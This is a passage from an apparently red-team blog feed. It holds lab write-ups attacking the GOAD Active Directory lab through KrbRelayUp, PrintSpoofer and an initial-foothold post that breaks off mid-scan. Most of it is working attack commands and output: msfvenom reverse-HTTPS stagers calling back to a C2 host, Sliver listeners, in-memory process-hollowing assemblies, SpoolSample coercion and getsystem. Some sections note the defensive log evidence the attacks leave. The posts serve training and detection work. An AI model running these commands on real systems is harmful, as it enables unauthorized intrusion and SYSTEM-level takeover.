started</span><br><span class="line">[+] Clean-up done</span><br><span class="line"></span><br><span class="line">[*] Session 61e64f68 SUCCESSFUL_FOREBEAR - tcp([::1]:56534)-&gt;192.168.24.22 (castelblack) - windows/amd64 - Sun, 02 Apr 2023 02:01:29 EET</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Serving the <code>hta</code> shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/kali/.msf4/local/shell.hta     </span><br><span class="line">$ python3 -m http.server 10443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 10443 (http://0.0.0.0:10443/) ...</span><br><span class="line">127.0.0.1 - - [02/Apr/2023 02:00:51] <span class="string">&quot;GET /shell.hta HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Checking the obtained session privileges.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sliver (PURPLE_SOOT) &gt; use 61e64f68</span><br><span class="line"></span><br><span class="line">[*] Active session SUCCESSFUL_FOREBEAR (61e64f68-6392-43cf-b945-1b9b4f5b9a2a)</span><br><span class="line"></span><br><span class="line">sliver (SUCCESSFUL_FOREBEAR) &gt; info</span><br><span class="line"></span><br><span class="line">        Session ID: 61e64f68-6392-43cf-b945-1b9b4f5b9a2a</span><br><span class="line">              Name: SUCCESSFUL_FOREBEAR</span><br><span class="line">          Hostname: castelblack</span><br><span class="line">              UUID: b2734d56-2bb6-d2e4-e42d-56bcc5a0d285</span><br><span class="line">          Username: NT AUTHORITY\SYSTEM</span><br><span class="line">               UID: S-1-5-18</span><br><span class="line">               GID: S-1-5-18</span><br><span class="line">               PID: 5312</span><br><span class="line">                OS: windows</span><br><span class="line">           Version: Server 2016 build 17763 x86_64</span><br><span class="line">            Locale: en-US</span><br><span class="line">              Arch: amd64</span><br><span class="line">         Active C2: https://192.168.24.138</span><br><span class="line">    Remote Address: tcp([::1]:56534)-&gt;192.168.24.22</span><br><span class="line">         Proxy URL: </span><br><span class="line">Reconnect Interval: 1m0s</span><br><span class="line">     First Contact: Sun Apr  2 02:01:29 EET 2023 (28m27s ago)</span><br><span class="line">      Last Checkin: Sun Apr  2 02:29:54 EET 2023 (2s ago)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><ol><li><p>Machine account was created.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/image-20230402150915102.png" class=""></li><li><p>Machine account password was reset.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/image-20230402150947837.png" class=""></li><li><p>TGT was requested for the newly created machine account - s4u2self.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/image-20230402151413344.png" class=""></li><li><p>TGS request to access the exploited target transited from the new machine account - s4u2proxy.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/image-20230402151717957.png" class=""></li><li><p>On the exploited local system, there will be a successfull login for the domain administrator from 127.0.0.1.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/image-20230402153246981.png" class=""></li><li><p>As we escalated our privilege through an <code>hta</code> reverse shell, there will be an evidence for this too on the local system.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/image-20230402153758916.png" class=""></li></ol>]]></content>
      
      
      <categories>
          
          <category> red team </category>
          
          <category> privilege escalation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kerberos relay </tag>
            
            <tag> krbrelayup </tag>
            
            <tag> RBCD </tag>
            
            <tag> Delegations </tag>
            
            <tag> mshta </tag>
            
            <tag> hta </tag>
            
            <tag> metasploit </tag>
            
            <tag> T1558 </tag>
            
            <tag> T1548 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.a Privilege Escalation - Printspoofer</title>
      <link href="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/"/>
      <url>https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is built on what we have acheieved on our last post <a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" title="1. Gaining Initial Foothold">1. Gaining Initial Foothold</a>.</p><p>We will be able to spoof a printer named pipe to escalate our privileges to system user.</p><h2 id="Migration"><a href="#Migration" class="headerlink" title="Migration"></a>Migration</h2><p>After gaining the intial access on the target, we had to migrate to some stable proccess other than our <code>W3wp.exe</code> one, this should be done by selecting an appropriate process from the target I cooshed <code>explorer.exe</code>.</p><p>We can create a new explorer.exe process then we can list the processes to get the newly created process id to use it in the migration.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; execute explorer.exe</span><br><span class="line"></span><br><span class="line">[*] Command executed successfully</span><br><span class="line"></span><br><span class="line">sliver (NORTHERN_CONCRETE) &gt; ps</span><br><span class="line"></span><br><span class="line"> Pid    Ppid   Owner                        Arch     Executable          Session </span><br><span class="line">====== ====== ============================ ======== =================== =========</span><br><span class="line"> 0      0                                            [System Process]    -1      </span><br><span class="line"> 4      0                                            System              -1      </span><br><span class="line"> 68     4                                            Registry            -1      </span><br><span class="line"> 496    4                                            smss.exe            -1      </span><br><span class="line"> 604    596                                          csrss.exe           -1      </span><br><span class="line"> 704    696                                          csrss.exe           -1      </span><br><span class="line">     </span><br><span class="line"> 4260   800                                          NisSrv.exe          -1      </span><br><span class="line"> 3796   2580   IIS APPPOOL\DefaultAppPool   x86_64   w3wp.exe            0       </span><br><span class="line"> 1072   800                                          winlogbeat.exe      -1      </span><br><span class="line"> 4820   800                                          WmiApSrv.exe        -1      </span><br><span class="line"> 1004   800                                          svchost.exe         -1      </span><br><span class="line"> 1168   800                                          svchost.exe         -1      </span><br><span class="line"> 3592   800                                          svchost.exe         -1      </span><br><span class="line"> 3356   3796   IIS APPPOOL\DefaultAppPool   x86_64   explorer.exe        0       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">⚠️  Security Product(s): Sysmon64, Windows Defender</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p>Then, we had to migrate to the newly created process.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; migrate 3356</span><br><span class="line"></span><br><span class="line">[*] Successfully migrated to 3356</span><br><span class="line"></span><br><span class="line">sliver (NORTHERN_CONCRETE) &gt; </span><br><span class="line">[*] Session 9ff22506 NORTHERN_CONCRETE - tcp([::1]:57616)-&gt;192.168.24.22 (castelblack) - windows/amd64 - Thu, 23 Feb 2023 16:47:46 EST</span><br></pre></td></tr></table></figure><h2 id="Situational-Awareness"><a href="#Situational-Awareness" class="headerlink" title="Situational Awareness"></a>Situational Awareness</h2><p>After gaining access to the target as user <code>IIS APPPOOL\DefaultAppPool</code>, we had to check our privileges by issuing a <code>whoami</code> command.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; sa-whoami </span><br><span class="line"></span><br><span class="line">[*] Successfully executed sa-whoami (coff-loader)</span><br><span class="line">[*] Got output:</span><br><span class="line"></span><br><span class="line">UserNameSID</span><br><span class="line">====================== ====================================</span><br><span class="line">IIS APPPOOL\DefaultAppPoolS-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION                                 Type                     SID                                          Attributes               </span><br><span class="line">================================================= ===================== ============================================= ==================================================</span><br><span class="line">Mandatory Label\High Mandatory Level              Label                    S-1-16-12288                                  Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">NT AUTHORITY\SERVICE                              Well-known group         S-1-5-6                                       Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">BUILTIN\IIS_IUSRS                                 Alias                    S-1-5-32-568                                  Mandatory group, Enabled by default, Enabled group, </span><br><span class="line">LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                       State                         </span><br><span class="line">============================= ================================================= ===========================</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      </span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      </span><br><span class="line">SeAuditPrivilege              Generate security audits                          Disabled                      </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                             Enabled                       </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled</span><br></pre></td></tr></table></figure><p>It can be seen that our user has <code>SeImpersonatePrivilege</code>, so let’s try the print spoofer exploit.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>I have made an exploit that combined print spoofer and process hollowing to be executed in memory through one file <a href="https://github.com/mmnoureldin/PrintSpoofSecure" title="" target="">PrintSpoofSecure</a> .</p><p>A valid shellcode stager is need here, so let’s get one using Metasploit.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/custom/reverse_winhttps LHOST=192.168.24.138 LPORT=443 LURI=/hello.woff exitfunc=thread -f csharp | <span class="built_in">tr</span> -d <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>After combining the shellcode and the our printspoofer, we had to compile them and run the outcome binary in memory as in below snippet.</p><p>Before running any furthure exploits, we had to adjust our handler. We will kill the initial handler and run another one for the metasploit shellcode handler.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; jobs </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 1    https   tcp        8443 </span><br><span class="line"> 2    https   tcp        443  </span><br><span class="line"></span><br><span class="line">sliver (NORTHERN_CONCRETE) &gt; jobs -k 1</span><br><span class="line"></span><br><span class="line">[*] Killing job #1 ...</span><br><span class="line">[*] Successfully killed job #1</span><br><span class="line"></span><br><span class="line">[!] Job #1 stopped (tcp/https)</span><br><span class="line"></span><br><span class="line">[!] Job #1 stopped (tcp/https)</span><br><span class="line"></span><br><span class="line">sliver (NORTHERN_CONCRETE) &gt; stage-listener --url https://192.168.24.128:8443 --profile win64 --prepend-size</span><br><span class="line"></span><br><span class="line">[*] No builds found for profile win64, generating a new one</span><br><span class="line">[*] Job 3 (https) started</span><br><span class="line"></span><br><span class="line">sliver (NORTHERN_CONCRETE) &gt; jobs </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 2    https   tcp        443  </span><br><span class="line"> 3    https   tcp        8443</span><br></pre></td></tr></table></figure><p>Now, we will run the printspoofer to create our malicious pipe.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; execute-assembly -i -M -E /home/kali/Documents/PrintSpoofSecure.exe &quot;\\test\\pipe\\spoolss&quot;</span><br></pre></td></tr></table></figure><p>As there are no results returned from our command, we can check the created pipes by lisiting them as.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; ls &quot;\\\\.\\pipe\\&quot;</span><br><span class="line"></span><br><span class="line">\\.\pipe\ (28 items, 66 B)</span><br><span class="line">==========================</span><br><span class="line">-rw-rw-rw-  atsvc                                                   3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Ctx_WinStation_API_service                              3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  epmapper                                                3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  eventlog                                                3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  InitShutdown                                            3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  lsass                                                   4 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  LSM_API_service                                         3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  ntsvcs                                                  3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER                  1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  PSHost.133215890693195793.292.DefaultAppDomain.conhost  1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  ROUTER                                                  3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  scerpc                                                  3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  SessEnvPublicRpc                                        3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  spoolss                                                 3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  srvsvc                                                  5 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  TermSrv_API_service                                     3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  test\pipe\spoolss                                       1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  trkwks                                                  3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  vgauth-service                                          1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  W32TIME_ALT                                             3 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Winsock2\CatalogChangeListener-220-0                    1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Winsock2\CatalogChangeListener-268-0                    1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Winsock2\CatalogChangeListener-2d8-0                    1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Winsock2\CatalogChangeListener-348-0                    1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Winsock2\CatalogChangeListener-358-0                    1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Winsock2\CatalogChangeListener-47c-0                    1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  Winsock2\CatalogChangeListener-52c-0                    1 B  Fri Jul 22 00:34:33 +0100 2185</span><br><span class="line">-rw-rw-rw-  wkssvc                                                  4 B  Fri Jul 22 00:34:33 +0100 2185</span><br></pre></td></tr></table></figure><p>Our spoofed pipe is created as <code>test\pipe\spoolss</code>. Now it is the time for running the sppolsample assembly to induce the spool service to connect to our pipe where we can impersonate it’s user.</p><p>I just used <a href="https://github.com/leechristensen/SpoolSample" title="" target="">SpoolSample</a>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; execute-assembly  -M -E /home/kali/Documents/SpoolSample.exe castelblack &quot;castelblack/pipe/test&quot;</span><br><span class="line"></span><br><span class="line">[*] Output:</span><br><span class="line">Waiting for connection on namedpipe: \\.\pipe\test\pipe\spoolss</span><br><span class="line">ImpersonateNamedPipeClient: True</span><br><span class="line">OpenThreadToken: True</span><br><span class="line">Impersonated user is: NT AUTHORITY\SYSTEM.</span><br><span class="line">Got process information and located PEB address of process at 0x3c6d688010. Success: True.</span><br><span class="line">DEBUG: Executable base address: 0x7ff604c10000.</span><br><span class="line">DEBUG: e_lfanew offset: 0xe8.</span><br><span class="line">DEBUG: RVA offset: 0x110.</span><br><span class="line">DEBUG: RVA value: 0x4510.</span><br><span class="line">Got executable entrypoint address: 0x7ff604c14510.</span><br><span class="line">Overwrote entrypoint with payload. Success: True.</span><br><span class="line">Triggered payload. Success: True. Check your listener!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Session af1ee5d4 LARGE_SHOE - tcp([::1]:57270)-&gt;192.168.24.22 (castelblack) - windows/amd64 - Wed, 22 Feb 2023 20:00:29 EST</span><br></pre></td></tr></table></figure><p>Soon after that we should receive a new session as system user, let’s duplicate this session to get a redundant one, this can be acheievd by running <code>getsystem</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sliver (NORTHERN_CONCRETE) &gt; sessions </span><br><span class="line"></span><br><span class="line"> ID         Name             Transport   Remote Address                    Hostname      Username                     Operating System   Locale   Last Message                                Health  </span><br><span class="line">========== ================ =========== ================================= ============= ============================ ================== ======== =========================================== ========= </span><br><span class="line"> af1ee5d4   LARGE_SHOE       http(s)     tcp([::1]:57270)-&gt;192.168.24.22   castelblack   NT AUTHORITY\SYSTEM          windows/amd64      en-US    Wed Feb 22 20:00:46 EST 2023 (3s ago)       [ALIVE] </span><br><span class="line"> 6d5739e4   NORTHERN_CONCRETE   http(s)     tcp([::1]:39004)-&gt;192.168.24.22   castelblack   IIS APPPOOL\DefaultAppPool   windows/amd64      en-US    Wed Feb 22 20:00:46 EST 2023 (3s ago)       [ALIVE] </span><br><span class="line"></span><br><span class="line">sliver (NORTHERN_CONCRETE) &gt; use af1ee5d4-e9bc-4d71-8cfb-4a5b3092319b</span><br><span class="line"></span><br><span class="line">[*] Active session LARGE_SHOE (af1ee5d4-e9bc-4d71-8cfb-4a5b3092319b)</span><br><span class="line"></span><br><span class="line">sliver (LARGE_SHOE) &gt; getsystem </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] A new SYSTEM session should pop soon...</span><br><span class="line"></span><br><span class="line">[*] Session d082cc38 LARGE_SHOE - tcp([::1]:40872)-&gt;192.168.24.22 (castelblack) - windows/amd64 - Wed, 22 Feb 2023 20:02:00 EST</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>From the current system session, we check session details and verify the username.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sliver (LARGE_SHOE) &gt; info</span><br><span class="line"></span><br><span class="line">        Session ID: af1ee5d4-e9bc-4d71-8cfb-4a5b3092319b</span><br><span class="line">              Name: LARGE_SHOE</span><br><span class="line">          Hostname: castelblack</span><br><span class="line">              UUID: 15254d56-94dd-cb7a-7637-ca4b44270e75</span><br><span class="line">          Username: NT AUTHORITY\SYSTEM</span><br><span class="line">               UID: S-1-5-18</span><br><span class="line">               GID: S-1-5-18</span><br><span class="line">               PID: 616</span><br><span class="line">                OS: windows</span><br><span class="line">           Version: Server 2016 build 17763 x86_64</span><br><span class="line">            Locale: en-US</span><br><span class="line">              Arch: amd64</span><br><span class="line">         Active C2: https://192.168.24.138</span><br><span class="line">    Remote Address: tcp([::1]:49618)-&gt;192.168.24.22</span><br><span class="line">         Proxy URL: </span><br><span class="line">Reconnect Interval: 1m0s</span><br><span class="line">     First Contact: Wed Feb 22 20:07:05 EST 2023 (2m13s ago)</span><br><span class="line">      Last Checkin: Wed Feb 22 20:09:12 EST 2023 (6s ago)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Mainly we are looking for events that relates to process injection and process creation.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/image-20230224025109340.png" class=""><p>It can be seen that the <code>w3wp.exe</code> process created notepad.exe as remote injection target, then a <code>CreateRemoteThread</code> API was called to inject shellcode in it. These notepad events should be results of <code>execute-assembly</code> command which injected into remote processes in our case.</p><p>Furthurmore, the created pipe log could be also found and had been accessed by the <code>system</code> user.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/image-20230430003853695.png" class="">]]></content>
      
      
      <categories>
          
          <category> red team </category>
          
          <category> privilege escalation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> T1055 </tag>
            
            <tag> Print Spoofer </tag>
            
            <tag> Spool sample </tag>
            
            <tag> T1134 </tag>
            
            <tag> T1003.001 </tag>
            
            <tag> named pipe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1. Gaining Initial Foothold</title>
      <link href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/"/>
      <url>https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In this post we are building on the previous post <a href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/" title="0. Basic Red Team Infrastructure">0. Basic Red Team Infrastructure</a>. We are targeting initial access through an exposed file upload form.</p><h2 id="Diagram"><a href="#Diagram" class="headerlink" title="Diagram"></a>Diagram</h2><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/Initial_access.png" class=""><h2 id="Players"><a href="#Players" class="headerlink" title="Players"></a>Players</h2><ul><li>Attacker machine: 192.168.25.128</li><li>Redirector machine: 192.168.25.138</li><li>Firewall: 192.168.24.138</li><li>Vicitm: <a href="https://github.com/Orange-Cyberdefense/GOAD" title="" target="">GOAD Castelblack</a>.</li></ul><span id="more"></span><h2 id="Setup-firewall-rules"><a href="#Setup-firewall-rules" class="headerlink" title="Setup firewall rules"></a>Setup firewall rules</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flush all rules</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables  -F</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable routing masqurade</span></span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="comment"># allow outgoing connections from GOAD to port 443 only</span></span><br><span class="line">iptables -A FORWARD -p tcp -s 192.168.24.0/24 --dport 443  -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp -d 192.168.24.0/24 --sport 443  -m conntrack --ctstate ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># allow incoming connections to SRV_02 on GOAD through port 80</span></span><br><span class="line">iptables -A FORWARD -p tcp -d 192.168.24.22 --dport 80 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp -s 192.168.24.22 --sport 80 -m conntrack --ctstate ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A FORWARD -j DROP</span><br></pre></td></tr></table></figure><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 